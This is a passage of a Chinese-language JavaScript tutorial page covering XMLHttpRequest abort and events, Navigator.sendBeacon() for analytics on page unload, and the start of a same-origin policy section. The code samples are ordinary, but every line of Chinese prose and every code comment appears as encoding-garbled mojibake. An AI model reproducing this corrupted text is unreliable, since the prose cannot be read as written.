<span class="token keyword">var</span> headerMap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">line</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> parts <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> header <span class="token operator">=</span> parts<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> value <span class="token operator">=</span> parts<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  headerMap<span class="token punctuation">[</span>header<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

headerMap<span class="token punctuation">[</span><span class="token string">'content-length'</span><span class="token punctuation">]</span> <span class="token comment">// &quot;6502&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="xmlhttprequest-abort"><a href="#xmlhttprequest-abort" class="header-anchor">#</a> XMLHttpRequest.abort()</h3> <p><code>XMLHttpRequest.abort()</code>æ–¹æ³•ç”¨æ¥ç»ˆæ­¢å·²ç»å‘å‡ºçš„ HTTP è¯·æ±‚ã€‚è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä»¥åï¼Œ<code>readyState</code>å±æ€§å˜ä¸º<code>4</code>ï¼Œ<code>status</code>å±æ€§å˜ä¸º<code>0</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://www.example.com/page.php'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token parameter">xhr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    xhr<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    xhr <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>ä¸Šé¢ä»£ç åœ¨å‘å‡º5ç§’ä¹‹åï¼Œç»ˆæ­¢ä¸€ä¸ª AJAX è¯·æ±‚ã€‚</p> <h2 id="_4-xmlhttprequest-å®ä¾‹çš„äº‹ä»¶"><a href="#_4-xmlhttprequest-å®ä¾‹çš„äº‹ä»¶" class="header-anchor">#</a> 4.XMLHttpRequest å®ä¾‹çš„äº‹ä»¶</h2> <h3 id="readystatechange-äº‹ä»¶"><a href="#readystatechange-äº‹ä»¶" class="header-anchor">#</a> readyStateChange äº‹ä»¶</h3> <p><code>readyState</code>å±æ€§çš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œå°±ä¼šè§¦å‘ readyStateChange äº‹ä»¶ã€‚</p> <p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>onReadyStateChange</code>å±æ€§ï¼ŒæŒ‡å®šè¿™ä¸ªäº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼Œå¯¹ä¸åŒçŠ¶æ€è¿›è¡Œä¸åŒå¤„ç†ã€‚å°¤å…¶æ˜¯å½“çŠ¶æ€å˜ä¸º<code>4</code>çš„æ—¶å€™ï¼Œè¡¨ç¤ºé€šä¿¡æˆåŠŸï¼Œè¿™æ—¶å›è°ƒå‡½æ•°å°±å¯ä»¥å¤„ç†æœåŠ¡å™¨ä¼ é€å›æ¥çš„æ•°æ®ã€‚</p> <h3 id="progress-äº‹ä»¶"><a href="#progress-äº‹ä»¶" class="header-anchor">#</a> progress äº‹ä»¶</h3> <p>ä¸Šä¼ æ–‡ä»¶æ—¶ï¼ŒXMLHttpRequest å®ä¾‹å¯¹è±¡æœ¬èº«å’Œå®ä¾‹çš„<code>upload</code>å±æ€§ï¼Œéƒ½æœ‰ä¸€ä¸ª<code>progress</code>äº‹ä»¶ï¼Œä¼šä¸æ–­è¿”å›ä¸Šä¼ çš„è¿›åº¦ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">updateProgress</span> <span class="token punctuation">(</span><span class="token parameter">oEvent</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>oEvent<span class="token punctuation">.</span>lengthComputable<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> percentComplete <span class="token operator">=</span> oEvent<span class="token punctuation">.</span>loaded <span class="token operator">/</span> oEvent<span class="token punctuation">.</span>total<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ— æ³•è®¡ç®—è¿›å±•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

xhr<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'progress'</span><span class="token punctuation">,</span> updateProgress<span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="load-äº‹ä»¶ã€error-äº‹ä»¶ã€abort-äº‹ä»¶"><a href="#load-äº‹ä»¶ã€error-äº‹ä»¶ã€abort-äº‹ä»¶" class="header-anchor">#</a> load äº‹ä»¶ã€error äº‹ä»¶ã€abort äº‹ä»¶</h3> <p>load äº‹ä»¶è¡¨ç¤ºæœåŠ¡å™¨ä¼ æ¥çš„æ•°æ®æ¥æ”¶å®Œæ¯•ï¼Œerror äº‹ä»¶è¡¨ç¤ºè¯·æ±‚å‡ºé”™ï¼Œabort äº‹ä»¶è¡¨ç¤ºè¯·æ±‚è¢«ä¸­æ–­ï¼ˆæ¯”å¦‚ç”¨æˆ·å–æ¶ˆè¯·æ±‚ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> transferComplete<span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> transferFailed<span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'abort'</span><span class="token punctuation">,</span> transferCanceled<span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">transferComplete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®æ¥æ”¶å®Œæ¯•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">transferFailed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®æ¥æ”¶å‡ºé”™'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">transferCanceled</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ç”¨æˆ·å–æ¶ˆæ¥æ”¶'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="loadend-äº‹ä»¶"><a href="#loadend-äº‹ä»¶" class="header-anchor">#</a> loadend äº‹ä»¶</h3> <p><code>abort</code>ã€<code>load</code>å’Œ<code>error</code>è¿™ä¸‰ä¸ªäº‹ä»¶ï¼Œä¼šä¼´éšä¸€ä¸ª<code>loadend</code>äº‹ä»¶ï¼Œè¡¨ç¤ºè¯·æ±‚ç»“æŸï¼Œä½†ä¸çŸ¥é“å…¶æ˜¯å¦æˆåŠŸã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'loadend'</span><span class="token punctuation">,</span> loadEnd<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">loadEnd</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'è¯·æ±‚ç»“æŸï¼ŒçŠ¶æ€æœªçŸ¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="timeout-äº‹ä»¶"><a href="#timeout-äº‹ä»¶" class="header-anchor">#</a> timeout äº‹ä»¶</h3> <p>æœåŠ¡å™¨è¶…è¿‡æŒ‡å®šæ—¶é—´è¿˜æ²¡æœ‰è¿”å›ç»“æœï¼Œå°±ä¼šè§¦å‘ timeout äº‹ä»¶ï¼Œå…·ä½“çš„ä¾‹å­å‚è§<code>timeout</code>å±æ€§ä¸€èŠ‚ã€‚</p> <h2 id="_5-navigator-sendbeacon"><a href="#_5-navigator-sendbeacon" class="header-anchor">#</a> 5.Navigator.sendBeacon()</h2> <p>ç”¨æˆ·å¸è½½ç½‘é¡µçš„æ—¶å€™ï¼Œæœ‰æ—¶éœ€è¦å‘æœåŠ¡å™¨å‘ä¸€äº›æ•°æ®ã€‚å¾ˆè‡ªç„¶çš„åšæ³•æ˜¯åœ¨<code>unload</code>äº‹ä»¶æˆ–<code>beforeunload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°é‡Œé¢ï¼Œä½¿ç”¨<code>XMLHttpRequest</code>å¯¹è±¡å‘é€æ•°æ®ã€‚ä½†æ˜¯ï¼Œè¿™æ ·åšä¸æ˜¯å¾ˆå¯é ï¼Œå› ä¸º<code>XMLHttpRequest</code>å¯¹è±¡æ˜¯å¼‚æ­¥å‘é€ï¼Œå¾ˆå¯èƒ½åœ¨å®ƒå³å°†å‘é€çš„æ—¶å€™ï¼Œé¡µé¢å·²ç»å¸è½½äº†ï¼Œä»è€Œå¯¼è‡´å‘é€å–æ¶ˆæˆ–è€…å‘é€å¤±è´¥ã€‚</p> <p>è§£å†³æ–¹æ³•å°±æ˜¯<code>unload</code>äº‹ä»¶é‡Œé¢ï¼ŒåŠ ä¸€äº›å¾ˆè€—æ—¶çš„åŒæ­¥æ“ä½œã€‚è¿™æ ·å°±èƒ½ç•™å‡ºè¶³å¤Ÿçš„æ—¶é—´ï¼Œä¿è¯å¼‚æ­¥ AJAX èƒ½å¤Ÿå‘é€æˆåŠŸã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'/log'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'foo=bar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'unload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// a time-consuming operation</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> m<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¼ºåˆ¶æ‰§è¡Œäº†ä¸€æ¬¡åŒé‡å¾ªç¯ï¼Œæ‹–é•¿äº†<code>unload</code>äº‹ä»¶çš„æ‰§è¡Œæ—¶é—´ï¼Œå¯¼è‡´å¼‚æ­¥ AJAX èƒ½å¤Ÿå‘é€æˆåŠŸã€‚</p> <p>ç±»ä¼¼çš„è¿˜å¯ä»¥ä½¿ç”¨<code>setTimeout</code>ã€‚ä¸‹é¢æ˜¯è¿½è¸ªç”¨æˆ·ç‚¹å‡»çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;a id=&quot;target&quot; href=&quot;https://baidu.com&quot;&gt;click&lt;/a&gt;</span>
<span class="token keyword">const</span> clickTime <span class="token operator">=</span> <span class="token number">350</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> theLink <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'/log'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'foo=bar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

theLink<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> theLink<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> clickTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>ä¸Šé¢ä»£ç ä½¿ç”¨<code>setTimeout</code>ï¼Œæ‹–å»¶äº†350æ¯«ç§’ï¼Œæ‰è®©é¡µé¢è·³è½¬ï¼Œå› æ­¤ä½¿å¾—å¼‚æ­¥ AJAX æœ‰æ—¶é—´å‘å‡ºã€‚</p> <p>è¿™äº›åšæ³•çš„å…±åŒé—®é¢˜æ˜¯ï¼Œå¸è½½çš„æ—¶é—´è¢«ç¡¬ç”Ÿç”Ÿæ‹–é•¿äº†ï¼Œåé¢é¡µé¢çš„åŠ è½½è¢«æ¨è¿Ÿäº†ï¼Œç”¨æˆ·ä½“éªŒä¸å¥½ã€‚</p> <p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæµè§ˆå™¨å¼•å…¥äº†<code>Navigator.sendBeacon()</code>æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•è¿˜æ˜¯å¼‚æ­¥å‘å‡ºè¯·æ±‚ï¼Œä½†æ˜¯è¯·æ±‚ä¸å½“å‰é¡µé¢çº¿ç¨‹è„±é’©ï¼Œä½œä¸ºæµè§ˆå™¨è¿›ç¨‹çš„ä»»åŠ¡ï¼Œå› æ­¤å¯ä»¥ä¿è¯ä¼šæŠŠæ•°æ®å‘å‡ºå»ï¼Œä¸æ‹–å»¶å¸è½½æµç¨‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'unload'</span><span class="token punctuation">,</span> logData<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">logData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">'/log'</span><span class="token punctuation">,</span> analyticsData<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><code>Navigator.sendBeacon</code>æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡æœåŠ¡å™¨çš„ URLï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ‰€è¦å‘é€çš„æ•°æ®ï¼ˆå¯é€‰ï¼‰ï¼Œå¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼ˆå­—ç¬¦ä¸²ã€è¡¨å•å¯¹è±¡ã€äºŒè¿›åˆ¶å¯¹è±¡ç­‰ç­‰ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒæˆåŠŸå‘é€æ•°æ®ä¸º<code>true</code>ï¼Œå¦åˆ™ä¸º<code>false</code>ã€‚</p> <p>è¯¥æ–¹æ³•å‘é€æ•°æ®çš„ HTTP æ–¹æ³•æ˜¯ POSTï¼Œå¯ä»¥è·¨åŸŸï¼Œç±»ä¼¼äºè¡¨å•æäº¤æ•°æ®ã€‚å®ƒä¸èƒ½æŒ‡å®šå›è°ƒå‡½æ•°ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;body onload=&quot;analytics('start')&quot; onunload=&quot;analytics('end')&quot;&gt;</span>

<span class="token keyword">function</span> <span class="token function">analytics</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>navigator<span class="token punctuation">.</span>sendBeacon<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>

  <span class="token keyword">var</span> <span class="token constant">URL</span> <span class="token operator">=</span> <span class="token string">'http://example.com/analytics'</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">'state='</span> <span class="token operator">+</span> state <span class="token operator">+</span> <span class="token string">'&amp;location='</span> <span class="token operator">+</span> window<span class="token punctuation">.</span>location<span class="token punctuation">;</span>
  navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="äº”ã€åŒæºé™åˆ¶"><a href="#äº”ã€åŒæºé™åˆ¶" class="header-anchor">#</a> äº”ã€åŒæºé™åˆ¶</h2> <p>æµè§ˆå™¨å®‰å…¨çš„åŸºçŸ³æ˜¯â€œåŒæºæ”¿ç­–â€ï¼ˆ<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener noreferrer">same-origin policy<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ï¼‰ã€‚å¾ˆå¤šå¼€å‘è€…éƒ½çŸ¥é“è¿™ä¸€ç‚¹ï¼Œä½†äº†è§£å¾—ä¸å…¨é¢ã€‚</p> <h2 id="_1-æ¦‚è¿°-2"><a href="#_1-æ¦‚è¿°-2" class="header-anchor">#</a> 1.æ¦‚è¿°</h2> <h3 id="å«ä¹‰"><a href="#å«ä¹‰" class="header-anchor">#</a> å«ä¹‰</h3> <p>1995å¹´ï¼ŒåŒæºæ”¿ç­–ç”± Netscape å…¬å¸å¼•å…¥æµè§ˆå™¨ã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½å®è¡Œè¿™ä¸ªæ”¿ç­–ã€‚</p> <p>æœ€åˆï¼Œå®ƒçš„å«ä¹‰æ˜¯æŒ‡ï¼ŒA ç½‘é¡µè®¾ç½®çš„ Cookieï¼ŒB ç½‘é¡µä¸èƒ½æ‰“å¼€ï¼Œé™¤éè¿™ä¸¤ä¸ªç½‘é¡µâ€œåŒæºâ€ã€‚æ‰€è°“â€œåŒæºâ€æŒ‡çš„æ˜¯â€œä¸‰ä¸ªç›¸åŒâ€ã€‚</p> <blockquote><ul><li>åè®®ç›¸åŒ</li> <li>åŸŸåç›¸åŒ</li> <li>ç«¯å£ç›¸åŒï¼ˆè¿™ç‚¹å¯ä»¥å¿½ç•¥ï¼Œè¯¦è§ä¸‹æ–‡ï¼‰</li></ul></blockquote> <p>ä¸¾ä¾‹æ¥è¯´ï¼Œ<code>http://www.example.com/dir/page.html</code>è¿™ä¸ªç½‘å€ï¼Œåè®®æ˜¯<code>http://</code>ï¼ŒåŸŸåæ˜¯<code>www.example.com</code>ï¼Œç«¯å£æ˜¯<code>80</code>ï¼ˆé»˜è®¤ç«¯å£å¯ä»¥çœç•¥ï¼‰ï¼Œå®ƒçš„åŒæºæƒ…å†µå¦‚ä¸‹ã€‚</p> <ul><li><code>http://www.example.com/dir2/other.html</code>ï¼šåŒæº</li> <li><code>http://example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li> <li><code>http://v2.www.example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li> 